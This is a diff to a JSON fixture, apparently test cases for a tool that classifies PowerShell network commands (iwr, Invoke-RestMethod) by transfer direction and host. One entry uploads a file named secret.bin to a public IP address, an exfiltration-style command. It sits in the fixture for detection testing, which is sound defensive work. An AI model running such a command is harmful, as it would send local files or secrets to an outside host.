@@ -6370,6 +6370,84 @@
      }
     ]
    }
+  },
+  {
+   "command": "powershell -Command \"iwr -Uri https://8.8.8.8/up -InF secret.bin\"",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "iwr -Ur https://example.com/a",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "iwr -Pr http://proxy.corp:3128 https://example.com/a",
+   "transfer": null
+  },
+  {
+   "command": "iwr -Uri https://example.com/a -OutF a.zip",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "Invoke-RestMethod -Ur https://example.com/api -Meth Post",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "iwr -Uri https://example.com/a -cm POST",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "iwr -Uri https://example.com/a -Prox:http://proxy.corp:3128",
+   "transfer": null
   }
  ]
 }
